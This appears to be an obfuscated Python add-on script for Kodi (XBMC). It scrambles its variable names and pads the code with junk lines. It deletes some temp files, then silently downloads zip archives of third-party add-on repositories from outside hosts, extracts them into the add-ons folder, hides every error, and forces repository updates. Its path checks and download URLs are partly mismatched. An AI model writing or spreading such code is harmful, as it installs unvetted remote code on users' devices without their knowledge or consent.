#!/usr/bin/python
#coding=utf-8
import os , xbmc , urllib , zipfile , contextlib
if 64 - 64: i11iIiiIii
def OO0o ( ) :
 Oo0Ooo = xbmc . translatePath ( "special://temp" )
 O0O0OO0O0O0 = next ( os . walk ( Oo0Ooo ) ) [ 2 ]
 if 5 - 5: iiI / ii1I
 for ooO0OO000o in O0O0OO0O0O0 :
  if ".fi" in ooO0OO000o :
   os . remove ( os . path . join ( Oo0Ooo , ooO0OO000o ) )
   if 4 - 4: IiII1IiiIiI1 / iIiiiI1IiI1I1
def o0OoOoOO00 ( ) :
 I11i = xbmc . translatePath ( 'special://home/addons' )
 if 64 - 64: OOooo000oo0 . i1 * ii1IiI1i % IIIiiIIii
 I11iIi1I = xbmc . translatePath ( 'special://temp' )
 IiiIII111iI = False
 if 34 - 34: iii1I1I / O00oOoOoO0o0O . O0oo0OO0 + Oo0ooO0oo0oO . I1i1iI1i - II
 try :
  Oo = xbmc . translatePath ( 'special://home/addons/repository.podgod' )
  if not os . path . isdir ( Oo ) :
   I1Ii11I1Ii1i = "http://fusion.tvaddons.ag/xbmc-repos/english/repository.podgod-1.7.zip"
   Ooo = xbmc . translatePath ( os . path . join ( I11iIi1I , "temp.zip" ) )
   urllib . urlretrieve ( I1Ii11I1Ii1i , Ooo )
   with contextlib . closing ( zipfile . ZipFile ( Ooo , "r" ) ) as o0oOoO00o :
    o0oOoO00o . extractall ( I11i )
   IiiIII111iI = True
 except : pass
 if 43 - 43: O0OOo . II1Iiii1111i
 try :
  Oo = xbmc . translatePath ( 'special://home/addons/repository.unofficialsportsdevil-' )
  if not os . path . isdir ( Oo ) :
   I1Ii11I1Ii1i = "http://fusion.tvaddons.ag/xbmc-repos/english/repository.unofficialsportsdevil-1.0.0.zip"
   Ooo = xbmc . translatePath ( os . path . join ( I11iIi1I , "temp.zip" ) )
   urllib . urlretrieve ( I1Ii11I1Ii1i , Ooo )
   with contextlib . closing ( zipfile . ZipFile ( Ooo , "r" ) ) as o0oOoO00o :
    o0oOoO00o . extractall ( I11i )
   IiiIII111iI = True
 except : pass
 if 25 - 25: OOo000
 try :
  Oo = xbmc . translatePath ( 'special://home/addons/xbmc.repo.xshare' )
  if not os . path . isdir ( Oo ) :
   I1Ii11I1Ii1i = "https://cthlo.github.io/cthlo-kodi-repo/zips/repository.cthlo-kodi-repo/repository.cthlo-kodi-repo-1.0.0.zip"
   Ooo = xbmc . translatePath ( os . path . join ( I11iIi1I , "temp.zip" ) )
   urllib . urlretrieve ( I1Ii11I1Ii1i , Ooo )
   with contextlib . closing ( zipfile . ZipFile ( Ooo , "r" ) ) as o0oOoO00o :
    o0oOoO00o . extractall ( I11i )
   IiiIII111iI = True
 except : pass
 if 82 - 82: o000o0o00o0Oo . ii11 % Oo0ooO0oo0oO / ii11 + o000o0o00o0Oo - ii1I
 try :
  Oo = xbmc . translatePath ( 'special://home/addons/repository.cthlo-kodi-repo' )
  if not os . path . isdir ( Oo ) :
   I1Ii11I1Ii1i = "https://github.com/thaitni/xbmc.repo.xshare/raw/master/xbmc.repo.xshare/xbmc.repo.xshare-1.0.0.zip"
   Ooo = xbmc . translatePath ( os . path . join ( I11iIi1I , "temp.zip" ) )
   urllib . urlretrieve ( I1Ii11I1Ii1i , Ooo )
   with contextlib . closing ( zipfile . ZipFile ( Ooo , "r" ) ) as o0oOoO00o :
    o0oOoO00o . extractall ( I11i )
   IiiIII111iI = True
 except : pass
 if 98 - 98: OOooo000oo0 * ii1I
 if IiiIII111iI :
  xbmc . executebuiltin ( "XBMC.UpdateLocalAddons()" )
  xbmc . executebuiltin ( "XBMC.UpdateAddonRepos()" )
  if 44 - 44: Oo0ooO0oo0oO / ii1IiI1i - OOooo000oo0 - i11iIiiIii % o000o0o00o0Oo
try :
 OO0o ( )
except : pass
try :
 o0OoOoOO00 ( )
except : pass
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
